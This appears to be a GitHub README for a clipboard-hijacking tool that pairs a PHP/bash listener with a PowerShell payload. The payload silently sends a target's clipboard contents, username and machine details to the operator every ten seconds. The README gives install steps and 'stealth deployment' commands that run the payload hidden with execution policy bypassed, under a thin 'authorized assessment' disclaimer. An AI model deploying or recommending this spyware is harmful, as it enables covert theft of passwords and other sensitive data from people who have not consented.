# Falcon Clip Board Hijacker 🦅

<p align="center">
    <img src="https://raw.githubusercontent.com/rgsecteam/rgsectm/refs/heads/main/image/thumbinels/falcon.png">
</p>

<img src="https://img.shields.io/badge/License-MIT-blue.svg">

# What is Falcon-Hijacker?
<p>Falcon Hijacker is a professional clipboard monitoring tool designed for authorized security assessments. It captures real-time clipboard data from target systems through a streamlined bash interface.</p>

## This Tool Tested On :
  - Kali Linux
  - Parrot Sec OS


## 📊 Advanced Monitoring

  - **Live Data Stream:** Real-time clipboard viewing
  - **Structured Logging:** Timestamped entries with metadata
  - **Multiple Targets:** Capture from multiple machines simultaneously
  - **Export Ready:** Clean log format for analysis

## PowerShell Payload (clipboard_logger.ps1)
  - **Frequency:** Checks clipboard every 10 seconds
  - **Data Sent:** Clipboard content + machine info + username
  - **Stealth:** No visible window, error suppression
  - **Persistence:** Runs until manually stopped

## Installing and requirements
<p>This tool require PHP for webserver, and wget for downloading dependencies. First run following command on your terminal</p>

```
apt-get -y install php wget
```

## Installing Falcon:

```
git clone https://github.com/rgsecteam/falcon-hijacker
cd falcon-hijacker
bash falcon.sh
```
## Stealth Deployment:
<p>Run the following command on windows matchin. </p>

```
powershell -NoP -NonI -W h -Exec Bypass .\clipboardhijacker.ps1
```
<p>For Hidden Execution</p>

```
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File .\clipboardhijacker.ps1"
```

## Legal & Ethical Notice
By using the materials in this repository you agree to:
- Use the information only for defensive, educational, or research purposes in controlled environments.
- Follow all applicable laws and organizational policies.
- Not distribute or operationalize any malicious code.
- **Do not** use this repository to harm others. Always obtain explicit permission before testing on systems you do not own.

#### For More Video subcribe <a href="http://youtube.com/@RGSecurityTeam">RGSecurityTeam YouTube Channel</a>

<p>Falcon-hijacker is inspired by https://github.com/techchipnet/ Big thanks to @techchipnet</p>
